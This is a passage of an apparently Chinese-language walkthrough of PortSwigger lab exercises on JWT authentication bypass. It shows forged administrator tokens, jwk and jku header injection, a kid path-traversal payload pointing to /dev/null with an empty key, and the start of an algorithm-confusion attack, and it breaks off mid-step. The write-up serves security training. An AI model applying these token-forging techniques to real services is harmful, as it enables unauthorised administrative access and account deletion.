[![](assets/1701606917-bc410da83a4c49c7edb906a65bf5fe89.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016142735-18520df8-6bed-1.png)

payload(新)：

```plain
{"iss":"portswigger","sub":"administrator","exp":1687799959}
eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODc3OTk5NTl9
```

[![](assets/1701606917-45dacf89180c76e5d5035a1566205b64.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016142753-2356d314-6bed-1.png)  
Signer:

```plain
E891AutpjiwkhVUDV2dZdrfGzsv5TweyIUUhT_a1Ar0
```

[![](assets/1701606917-94b90071e9bf4fdd061f6eaafe4d2b09.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016142822-342cdd0a-6bed-1.png)  
最终高权限的JWT token如下：

```plain
eyJraWQiOiJjY2Y4Yjk3YS05NGZlLTRjN2QtOWI2MS0yNzZmMDY1NGMyZWIiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODc3OTk5NTl9.E891AutpjiwkhVUDV2dZdrfGzsv5TweyIUUhT_a1Ar0
```

[![](assets/1701606917-1b6a625b54b8c18fc8698856fda78277.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016142840-3f22696e-6bed-1.png)  
Step 6：访问/admin路径

[![](assets/1701606917-d82e3feaf1545bff8854ba0c75f69639.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016142856-488512ae-6bed-1.png)  
Step 7：调用接口删除用户完成解答

[![](assets/1701606917-b029bc256a0abb3dc9ad29f1e42e2866.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016142911-51bc21b4-6bed-1.png)

[![](assets/1701606917-a44aa79971f22cc6338b0ef15a1d4227.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016142920-570d926a-6bed-1.png)

##### JWT头部注入

###### 场景介绍

如果服务器端使用一个非常脆弱的密钥，我们甚至有可能一个字符一个字符地来暴力破解这个密钥，根据JWS规范只有alg报头参数是强制的，然而在实践中JWT报头通常包含几个其他参数，以下是攻击者特别感兴趣的：

*   jwk(JSON Web Key)：提供一个代表密钥的嵌入式JSON对象
*   jku(JSON Web Key Set URL)：提供一个URL，服务器可以从这个URL获取一组包含正确密钥的密钥
*   kid(密钥id)：提供一个ID，在有多个密钥可供选择的情况下服务器可以用它来识别正确的密钥，根据键的格式这可能有一个匹配的kid参数

这些用户可控制的参数每个都告诉接收方服务器在验证签名时应该使用哪个密钥，下面我们将介绍如何利用这些参数来注入使用您自己的任意密钥而不是服务器的密钥签名修改过的JWT

###### 注入场景1

下面我们介绍如何通过JWK参数注入自签名的JWT，JWS(JSON Web Signature)规范描述了一个可选的jwk header参数，服务器可以使用该参数以jwk格式将其公钥直接嵌入令牌本身，您可以在下面的JWT head中看到具体的示例:

```plain
{
    "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
    "typ": "JWT",
    "alg": "RS256",
    "jwk": {
        "kty": "RSA",
        "e": "AQAB",
        "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
        "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
    }
}
```

理想情况下服务器应该只使用有限的公钥白名单来验证JWT签名，然而错误配置的服务器有时会使用jwk参数中嵌入的键值，您可以通过使用自己的RSA私钥对修改后的JWT进行签名，然后在jwk头中嵌入匹配的公钥来利用这种行为，Burpsuite的JWT Editor扩展提供了一个有用的功能来帮助您测试此漏洞，您可以在Burp中手动添加或修改JWT参数  
靶场地址：[https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection)

[![](assets/1701606917-558196b4aa475da9d4e772947366f686.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016143014-7720a0f6-6bed-1.png)  
Step 1：点击"ACCESS THE LAB"访问靶场  
[![](assets/1701606917-dc6e9dd65a09c78ce043457c02faaaed.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016143027-7ea82ad8-6bed-1.png)  
Step 3：点击"My Account"登录系统

```plain
wiener:peter
```

[![](assets/1701606917-53a06f5f04c6c91d1dcea227877c01bd.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016143047-8ad21792-6bed-1.png)  
Step 4：登录之后可以看到如下邮箱更新界面  
[![](assets/1701606917-8420d2dba619e68a5ad69d87dd27a161.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016143102-9389c3ee-6bed-1.png)  
Step 5：下面我们开始操作，不过在此之前我们得先武器化以下自己，在Burpsuite界面选择"Extender"选项卡，紧接着点击"BApp Store"安装"JWT Editor"

[![](assets/1701606917-73e5e1b8a479f03f551d0097f5abf7c2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016143120-9e2cdc14-6bed-1.png)  
之后你可以看到如下的选项卡界面

[![](assets/1701606917-9701e92daadc4fb5e2887dbf7a3de5bd.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016143134-a6d4bd1e-6bed-1.png)  
Step 6：生成一个新的RSA密钥

```plain
{
    "p": "8J0fgpxQpZOvPGb2rRsJB6Bh0lgvxRtp_Ilc7NmpI3UgEUiArSey091pT3X6lIPRZLdMf_eeYo_PWh5aq79Ps_xoZHtAz4VrR9sR8tCkND-z0KKBmopkUrowJie368xoWDU53P-4qxEfCfqPPxoZZRzhE7cse0PUVayNAJC01FU",
    "kty": "RSA",
    "q": "1zMkdJNLYEdZYvZ31B15CmCfI9dOGEpn6lyXOEBPsqrP554x_8dXZnXSHbybiYyeLgl6i_JubJBqjeSAejwHh9v-e3-R9-7Dgg4lB_OUNqsg7yM3mcpZn7IHeGVKj9BjhigWsbUXFuwM1iEDK4TDmTV4-tO9UMsIBQA1SFlUTA8",
    "d": "Ayw2AASn_yn6EwjqCts6_gP6NZ9BlNhCG1iuDTX9h_AGWYBtUepdgp4CaM098ZyjH2Da3RvonFVlTOwHTgVAdkb2eWqeMejMjUji3cKIQRU_r0UeY3C4q8BBuWjwzF7ZTeVDgbx05NfeUW0LwWE3mFBuPDy6tmvYdekcs8Ft7GDmU_ToPZaGnMoEKzVlMyDb82LgkB7qWw2H4UoXHWR0l_RS90gTjkJzMc4Fmu4CoPfmqw8jLnGgq8GhAzpecc-VLvqel3tSY0fKqF5Y3U2SooL27vJJxX0kLgHVbcTNvCcS8XZArdhWTekV923jtspoNDYn5HfhAlLglCcwQcOSYQ",
    "e": "AQAB",
    "kid": "fa018615-0392-4d15-89bb-a2c637d9adbd",
    "qi": "XO3HEFj8PCxFz4DIw0djHjTrW4Krm-Oim-U4bmuEdmPDKKTIYYvkPVoSRR-4kCHkCx2aDsraUbNkTyEYC4dRUbnWl6xr2HxaLZIsxOglYsa939l_m6NXSzttAGrPpWqoURT7t6ihSmBnGDJDsMS3c1gWJKZsAYkeXy5lI2IhGks",
    "dp": "0gfldIZsY0w5_9jE5LAfvreCDDGMaVsXtihVpC4PVXMs7clDAWMQ152DCqiqdi9mfar_LQkCCXkM_9ZVQWw675qZqXRpS3xj_BI_ZZw4aZ9dn_XqefLpxcjetL-g7US9pJm5i67xDOpiFLzRg7yNhFSkKCiRvHumAq8fWen23w0",
    "dq": "QcZI6zSmAjxsjrnkcDm96DUWDv9cyEHdtx0rvy6w7VwWBaYthA8qoI98dEhUhdsr8chF44Zqx9XwK4Re3H2Ck7zi8F5SgCRDL3ohSWfisj7l5xGtidz2PcBNVjgnbQN1l-ii3xgJgaEOX1hhvqhqnGZins-e-pXD0rt4ja93-3M",
    "n": "ykQHB6Jelehm2eVfkb-2mSTpfODsGlthhS0sTLX5geGwsQCz4gnRbXPN5gOsCpqUbJH9gDE80q262XuS8DNrdmTLTPjuM4wRc-ghh9GvOCgJGBtO1PIVCTIsPmwhMra0eykwj246GReyoDcUhreG2yZ8rg-tHIcxPyWBtdKY2tubM6-YLk5gVLcuHRL25Fn_I5NghQbyzmISbulJ1CMq5WU-h9RA8IkYhVcrsP8Y1E2dc4fagKn5Tp60bUkjCcqIMAKouI-CX86mF0k3cSd340KuUXuf2vIo_yWMhZjFkAxj-gBn4eO3l2qZgyGkkHMn0HL8RSDzdG-BSBgNYoWs-w"
}
```

[![](assets/1701606917-de0022abb6b6d579ecba961268292607.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016143201-b7008448-6bed-1.png)  
Step 7：刷新页面拦截到请求并将请求发送到Repeat模块

[![](assets/1701606917-4dac73afad9dca96cc24ab2376e7bc62.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016143218-c0e6b928-6bed-1.png)  
Step 8：在Repeat模块，我们切换到JSON Web Token选项卡，修改JWT的有效负载将sub内容修改为administrator  
[![](assets/1701606917-fa522de23b938f418dcb10e024d2a560.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016143251-d4e22a48-6bed-1.png)  
[![](assets/1701606917-22de64b61eb1a37dbbcdcbbd1b83384f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016143306-dd8aca9c-6bed-1.png)  
Step 9：点击"Attack"，然后选择"Embedded JWK"，出现提示时选择您新生成的RSA密钥  
[![](assets/1701606917-c147de17441114746964f62b8c82e6c3.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016143325-e8dbec50-6bed-1.png)  
[![](assets/1701606917-834c8dd022f83eb7b8715f3c3a4b93ee.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016143338-f08d26ee-6bed-1.png)  
Step 10：之后成功越权

[![](assets/1701606917-35e79f6e5f25473476e6d988e2a5b3dc.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016143405-00eebdcc-6bee-1.png)

Step 11：调用敏感操作接口删除carlos用户完成解题

[![](assets/1701606917-0a2679776c103d65fbfc203ec660dff8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016143423-0b61bade-6bee-1.png)

[![](assets/1701606917-7b40a9361d8299d9e252edee3c69e1b4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016143433-1134c1f4-6bee-1.png)

###### 注入场景2

有些服务器可以使用jku(jwk Set URL)头参数来引用包含密钥的JWK集，而不是直接使用JWK头参数来嵌入公钥，当验证签名时，服务器从这个URL获取相关的密钥，这里的JWK集其实是一个JSON对象，包含一个代表不同键的JWK数组，下面是一个简单的例子：

```plain
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab",
            "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ"
        },
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA",
            "n": "fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw"
        }
    ]
}
```

JWK集合有时会通过一个标准端点公开，比如:/.well-known/jwks.json，更安全的网站只会从受信任的域获取密钥，但有时您可以利用URL解析差异来绕过这种过滤，下面我们通过一个靶场来实践以下  
靶场地址：[https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection)

[![](assets/1701606917-84dd95eda942a746fe2906f156757049.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016143510-2754495a-6bee-1.png)  
Step 1：首先点击上方的"ACCESS THE LAB"选项卡进入实验环境

[![](assets/1701606917-19650ecea9f64c50b6dcaf39d82f5941.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016143528-327603f0-6bee-1.png)

Step 2：登录系统

```plain
wiener:peter
```

[![](assets/1701606917-7617ed1ace301cd29c1d3c5a06d1e15e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016143550-3f63f158-6bee-1.png)  
Step 3：随后你会看到一个用户邮箱更新的表单

[![](assets/1701606917-4a569ecd24ee0a08004aaaffb9a22e34.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016143605-486802da-6bee-1.png)  
Step 4：使用burpsuite生成一个新的RSA密钥

```plain
{
    "p": "8J0fgpxQpZOvPGb2rRsJB6Bh0lgvxRtp_Ilc7NmpI3UgEUiArSey091pT3X6lIPRZLdMf_eeYo_PWh5aq79Ps_xoZHtAz4VrR9sR8tCkND-z0KKBmopkUrowJie368xoWDU53P-4qxEfCfqPPxoZZRzhE7cse0PUVayNAJC01FU",
    "kty": "RSA",
    "q": "1zMkdJNLYEdZYvZ31B15CmCfI9dOGEpn6lyXOEBPsqrP554x_8dXZnXSHbybiYyeLgl6i_JubJBqjeSAejwHh9v-e3-R9-7Dgg4lB_OUNqsg7yM3mcpZn7IHeGVKj9BjhigWsbUXFuwM1iEDK4TDmTV4-tO9UMsIBQA1SFlUTA8",
    "d": "Ayw2AASn_yn6EwjqCts6_gP6NZ9BlNhCG1iuDTX9h_AGWYBtUepdgp4CaM098ZyjH2Da3RvonFVlTOwHTgVAdkb2eWqeMejMjUji3cKIQRU_r0UeY3C4q8BBuWjwzF7ZTeVDgbx05NfeUW0LwWE3mFBuPDy6tmvYdekcs8Ft7GDmU_ToPZaGnMoEKzVlMyDb82LgkB7qWw2H4UoXHWR0l_RS90gTjkJzMc4Fmu4CoPfmqw8jLnGgq8GhAzpecc-VLvqel3tSY0fKqF5Y3U2SooL27vJJxX0kLgHVbcTNvCcS8XZArdhWTekV923jtspoNDYn5HfhAlLglCcwQcOSYQ",
    "e": "AQAB",
    "kid": "fa018615-0392-4d15-89bb-a2c637d9adbd",
    "qi": "XO3HEFj8PCxFz4DIw0djHjTrW4Krm-Oim-U4bmuEdmPDKKTIYYvkPVoSRR-4kCHkCx2aDsraUbNkTyEYC4dRUbnWl6xr2HxaLZIsxOglYsa939l_m6NXSzttAGrPpWqoURT7t6ihSmBnGDJDsMS3c1gWJKZsAYkeXy5lI2IhGks",
    "dp": "0gfldIZsY0w5_9jE5LAfvreCDDGMaVsXtihVpC4PVXMs7clDAWMQ152DCqiqdi9mfar_LQkCCXkM_9ZVQWw675qZqXRpS3xj_BI_ZZw4aZ9dn_XqefLpxcjetL-g7US9pJm5i67xDOpiFLzRg7yNhFSkKCiRvHumAq8fWen23w0",
    "dq": "QcZI6zSmAjxsjrnkcDm96DUWDv9cyEHdtx0rvy6w7VwWBaYthA8qoI98dEhUhdsr8chF44Zqx9XwK4Re3H2Ck7zi8F5SgCRDL3ohSWfisj7l5xGtidz2PcBNVjgnbQN1l-ii3xgJgaEOX1hhvqhqnGZins-e-pXD0rt4ja93-3M",
    "n": "ykQHB6Jelehm2eVfkb-2mSTpfODsGlthhS0sTLX5geGwsQCz4gnRbXPN5gOsCpqUbJH9gDE80q262XuS8DNrdmTLTPjuM4wRc-ghh9GvOCgJGBtO1PIVCTIsPmwhMra0eykwj246GReyoDcUhreG2yZ8rg-tHIcxPyWBtdKY2tubM6-YLk5gVLcuHRL25Fn_I5NghQbyzmISbulJ1CMq5WU-h9RA8IkYhVcrsP8Y1E2dc4fagKn5Tp60bUkjCcqIMAKouI-CX86mF0k3cSd340KuUXuf2vIo_yWMhZjFkAxj-gBn4eO3l2qZgyGkkHMn0HL8RSDzdG-BSBgNYoWs-w"
}
```

[![](assets/1701606917-0101515c2ad9c2494e01da6657f5e24c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016143629-56a92de2-6bee-1.png)

Step 5：发送请求到repeat

[![](assets/1701606917-c46864695b92b451f87846c995652544.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016143645-5fe2e7b8-6bee-1.png)  
Step 6：复制公钥作为JWK

```plain
{
    "kty": "RSA",
    "e": "AQAB",
    "kid": "fa018615-0392-4d15-89bb-a2c637d9adbd",
    "n": "ykQHB6Jelehm2eVfkb-2mSTpfODsGlthhS0sTLX5geGwsQCz4gnRbXPN5gOsCpqUbJH9gDE80q262XuS8DNrdmTLTPjuM4wRc-ghh9GvOCgJGBtO1PIVCTIsPmwhMra0eykwj246GReyoDcUhreG2yZ8rg-tHIcxPyWBtdKY2tubM6-YLk5gVLcuHRL25Fn_I5NghQbyzmISbulJ1CMq5WU-h9RA8IkYhVcrsP8Y1E2dc4fagKn5Tp60bUkjCcqIMAKouI-CX86mF0k3cSd340KuUXuf2vIo_yWMhZjFkAxj-gBn4eO3l2qZgyGkkHMn0HL8RSDzdG-BSBgNYoWs-w"
}
```

[![](assets/1701606917-53a4b28e15f66264bcbf840a96ae5e30.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016143708-6e269d88-6bee-1.png)  
Step 7：在题目中选择"Go eo exploit server"，然后加上key头并保存到exploit的body中

```plain
{
   "keys": [
       {
           "kty": "RSA",
           "e": "AQAB",
           "kid": "fa018615-0392-4d15-89bb-a2c637d9adbd",
           "n": "ykQHB6Jelehm2eVfkb-2mSTpfODsGlthhS0sTLX5geGwsQCz4gnRbXPN5gOsCpqUbJH9gDE80q262XuS8DNrdmTLTPjuM4wRc-ghh9GvOCgJGBtO1PIVCTIsPmwhMra0eykwj246GReyoDcUhreG2yZ8rg-tHIcxPyWBtdKY2tubM6-YLk5gVLcuHRL25Fn_I5NghQbyzmISbulJ1CMq5WU-h9RA8IkYhVcrsP8Y1E2dc4fagKn5Tp60bUkjCcqIMAKouI-CX86mF0k3cSd340KuUXuf2vIo_yWMhZjFkAxj-gBn4eO3l2qZgyGkkHMn0HL8RSDzdG-BSBgNYoWs-w"
     }
    ]
}
```

[![](assets/1701606917-a89682568aadbedd0b0c71a8e5a6e6a5.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016143906-b464119a-6bee-1.png)

[![](assets/1701606917-2c6bdae910be867e5847b4cfd8326e93.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016143918-bb2629c8-6bee-1.png)  
Step 8：然后切换至repeat的"JSON Web Token"界面，将kid修改成自己生成的JWK中的kid值，将jku的值改为exploit

[![](assets/1701606917-b1ee9292e9963d692cc1e8c81a357696.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016144012-dbd989da-6bee-1.png)

[![](assets/1701606917-76c7b56df0a82e30448cfd96e632aac3.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016144023-e25d56d8-6bee-1.png)  
Step 9：切换sub为administrator

[![](assets/1701606917-c8fa7a45630c0c2476571d96c9c6f442.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016144041-ecbc7172-6bee-1.png)  
Step 10：点击下面的sign，选择Don’t modify header模式

[![](assets/1701606917-8255244ee1c3640a4f35e24105e741e2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016144059-f7ace760-6bee-1.png)  
Step 11：更改请求路径发送请求成功越权  
[![](assets/1701606917-c4cf076e30073bcde40b0558405eecbe.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016144159-1b2c3de4-6bef-1.png)  
Step 12：请求敏感路径删除carlos用户

[![](assets/1701606917-04ffd048b595744833d718d4171f60f7.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016144216-2541bc32-6bef-1.png)  
Step 13：成功解题

[![](assets/1701606917-cc9462a8ab64a318364024db89e522a8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016144229-2d6678d0-6bef-1.png)

###### \# 注入场景3

服务器可能使用几个密钥来签署不同种类的数据，因此JWT的报头可能包含kid(密钥id)参数，这有助于服务器在验证签名时确定使用哪个密钥，验证密钥通常存储为一个JWK集，在这种情况下服务器可以简单地查找与令牌具有相同kid的JWK，然而JWS规范没有为这个ID定义具体的结构——它只是开发人员选择的任意字符串，例如:它们可能使用kid参数指向数据库中的特定条目，甚至是文件的名称，如果这个参数也容易受到目录遍历的攻击，攻击者可能会迫使服务器使用其文件系统中的任意文件作为验证密钥，例如：

```plain
{
    "kid": "../../path/to/file",
    "typ": "JWT",
    "alg": "HS256",
    "k": "asGsADas3421-dfh9DGN-AFDFDbasfd8-anfjkvc"
}
```

如果服务器也支持使用对称算法签名的jwt就会特别危险，在这种情况下攻击者可能会将kid参数指向一个可预测的静态文件，然后使用与该文件内容匹配的秘密对JWT进行签名，从理论上讲您可以对任何文件这样做，但是最简单的方法之一是使用/dev/null，这在大多数Linux系统上都存在，由于这是一个空文件，读取它将返回一个空字符串，因此用空字符串对令牌进行签名将会产生有效的签名  
靶场地址：[https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal)

[![](assets/1701606917-257ee3c7cdcc02607abe90bb9fa5c144.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016144308-445dac34-6bef-1.png)  
Step 1：点击上方"Access The Lab"进入靶场

[![](assets/1701606917-d2b4327206a8991e14771e696e0fc50e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016144322-4c9edb66-6bef-1.png)  
Step 2：登录靶场

[![](assets/1701606917-4a35a238c7e5d1de23c39492bc18d634.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016144341-58176e22-6bef-1.png)

Step 3：登录后进入到如下邮箱更新界面

[![](assets/1701606917-fde941460dc2b1459b20855752a175a2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016144353-5f4a3396-6bef-1.png)  
Step 4：使用burpsuite的插件生成一个对称密钥(Symmetric Key)并将k的值修改为"AA=="即为null

```plain
{
    "kty": "oct",
    "kid": "38576880-33b7-4446-ade4-f1a78bb6d5c2",
    "k": "AA=="
}
```

[![](assets/1701606917-1853669b7eede73b8409db63239ede22.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016144508-8bd26dca-6bef-1.png)

Step 5：拦截一个请求将其发送到repeat模块

[![](assets/1701606917-d96fa68cb0ee9f52cb44e8662c526256.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016144525-95eac4b0-6bef-1.png)

Step 6：此时直接访问/admin——提示"401 Unauthorized"

[![](assets/1701606917-d87a8f6751a77d42ec5937e3b3237ecf.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016144558-a9e4b89a-6bef-1.png)  
Step 7：在JSON Web Token界面中修改kid值和sub进行目录遍历，这里的"/dev/null"文件名与"AA=="一致都为null，对称密钥，所以可以成功绕过

```plain
{
    "kid": "../../../../../../../dev/null",
    "alg": "HS256"
}
```

[![](assets/1701606917-8e92a182118cce7659d6491c1bf3e3c1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016144625-b9cca0e2-6bef-1.png)

Step 8：点击sign选择OCT8 的密钥攻击

[![](assets/1701606917-c15a5ee33c068d486169c658abeaf4e4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016144644-c556dd88-6bef-1.png)

[![](assets/1701606917-17d86e157caba686143d0b359b03e03c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016144656-cc6c5c74-6bef-1.png)  
Step 9：成功越权

[![](assets/1701606917-eb8fb1199485d03d7632a78626c25143.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016144713-d6bc047c-6bef-1.png)  
Step 10：调用敏感接口删除carlos用户完成解题  
[![](assets/1701606917-42740c828737e96512d42e534ccc2d35.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016144729-dfc45d1c-6bef-1.png)  
[![](assets/1701606917-de8a9a84a139039ed9af68cc2138385a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016144740-e676aa16-6bef-1.png)

##### JWT算法混淆

###### 算法混淆

算法混淆攻击(也称为密钥混淆攻击)是指攻击者能够迫使服务器使用不同于网站开发人员预期的算法来验证JSON web令牌(JWT)的签名，这种情况如果处理不当，攻击者可能会伪造包含任意值的有效jwt而无需知道服务器的秘密签名密钥  
JWT可以使用一系列不同的算法进行签名，其中一些，例如:HS256(HMAC+SHA-256)使用"对称"密钥，这意味着服务器使用单个密钥对令牌进行签名和验证，显然这需要像密码一样保密

[![](assets/1701606917-982e7894c52106a61905d5c017dcc373.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016144849-0fd5c702-6bf0-1.png)  
其他算法，例如:RS256(RSA+SHA-256)使用"非对称"密钥对，它由一个私钥和一个数学上相关的公钥组成，私钥用于服务器对令牌进行签名，公钥可用于验证签名，顾名思义，私钥必须保密，但公钥通常是共享的，这样任何人都可以验证服务器发出的令牌的签名

[![](assets/1701606917-1a4c8f4f8f43284b7ea231bd8559704f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016144900-166d4f18-6bf0-1.png)

###### 混淆攻击

算法混乱漏洞通常是由于JWT库的实现存在缺陷而导致的，尽管实际的验证过程因所使用的算法而异，但许多库都提供了一种与算法无关的方法来验证签名，这些方法依赖于令牌头中的alg参数来确定它们应该执行的验证类型，下面的伪代码显示了一个简单的示例，说明了这个泛型verify()方法在JWT库中的声明：

```plain
function verify(token, secretOrPublicKey){
    algorithm = token.getAlgHeader();
    if(algorithm == "RS256"){
        // Use the provided key as an RSA public key
    } else if (algorithm == "HS256"){
        // Use the provided key as an HMAC secret key
    }
}
```

使用这种方法的网站开发人员认为它将专门处理使用RS256这样的非对称算法签名的JWT时，问题就出现了，由于这个有缺陷的假设他们可能总是传递一个固定的公钥给方法，如下所示:

```plain
publicKey = <public-key-of-server>;
token = request.getCookie("session");
verify(token, publicKey);
```

在这种情况下如果服务器接收到使用对称算法(例如:HS256)签名的令牌，库通用verify()方法会将公钥视为HMAC密钥，这意味着攻击者可以使用HS256和公钥对令牌进行签名，而服务器将使用相同的公钥来验证签名(备注:用于签署令牌的公钥必须与存储在服务器上的公钥完全相同，这包括使用相同的格式(如X.509 PEM)并保留任何非打印字符，例如:换行符,在实践中您可能需要尝试不同的格式才能使这种攻击奏效)  
攻击流程简易视图如下：

[![](assets/1701606917-1f77fc198b441207a305baf46659288b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016144946-31b0c282-6bf0-1.png)

###### 攻击演示

靶场地址：[https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion](https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion)

[![](assets/1701606917-f394a815192acd05ac68b95feb0e68d6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016145011-40ad726c-6bf0-1.png)  
Step 1：点击"Access the lab"访问靶场

[![](assets/1701606917-9763d41439bfd163e61ac42781f9c1ef.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016145024-486fe61a-6bf0-1.png)  
Step 2：使用账户密码登录  
[![](assets/1701606917-e8f65193854ebcb9408ca2d62efbcccc.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016145040-5227bbf6-6bf0-1.png)  
Step 3：登录之后进入到用户邮箱更新操作界面

[![](assets/1701606917-49f41b65702a56da07498c7c8e501616.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016145056-5b7e4c6a-6bf0-1.png)  
Step 4：服务器有时通过映射到/jwks.json或/.well-known/jwks.json的端点将它们的公钥公开为JSON Web Key(JWK)对象，比如大家熟知的/jwks.json，这些可能被存储在一个称为密钥的jwk数组中，这就是众所周知的JWK集合，即使密钥没有公开，您也可以从一对现有的jwt中提取它

```plain
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab",
            "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ"
        },
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA",
            "n": "fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw"
        }
    ]
}
```

于是乎我们可以直接访问/jwks.json接口获取到服务器的公钥信息，在此处我们将JWK复制下来，作为我们第二部的RSA Key  
[https://0aad003404004c0b817dcff9004c0050.web-security-academy.net/jwks.json](https://0aad003404004c0b817dcff9004c0050.web-security-academy.net/jwks.json)

```plain
{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "use": "sig",
      "kid": "63624c36-bfd8-4146-888e-6d032ad4fe18",
      "alg": "RS256",
      "n": "zsiIsVqAKSpOnOxMKrI0hT3p8m_NK3VoejFnt4Hx2CFzvJsZ4_9mmoIVwi_nXYr7NtNV7stOSS4MGzYdJ57t4v83B9h7uI1fdKSp-L-cisg31S0Wm5B_LDnvuABFMcShJ-DKTgEYfLHaG31JudlyJdnfgNIIa0XL-wbGh7Xshf8RtzR8FC2DfApX_-KXYNnHxnTKTPXl5unBgCxyny2n2CwoCIiYet7s7X1c3qhwktWk6xJTmvkrd85KBlDSyEjBhEPPXrbVfqo8sNxkY-E2FXIoPIt8m_VSXlsKyZpjpfXTJJZo_IqazAl1XBW6bjwWjxwee0Xbyt7M1_1dTKjaAw"
    }
  ]
}
```

[![](assets/1701606917-051f06f16b6bbf6b7e643ebe959b77e9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016145134-725aa578-6bf0-1.png)  
Step 5：在Burpsuite的JWT Editor Keys中点击"New RSA Key"，用之前泄露的JWK而生成一个新的RSA Key

```plain
{
      "kty": "RSA",
      "e": "AQAB",
      "use": "sig",
      "kid": "63624c36-bfd8-4146-888e-6d032ad4fe18",
      "alg": "RS256",
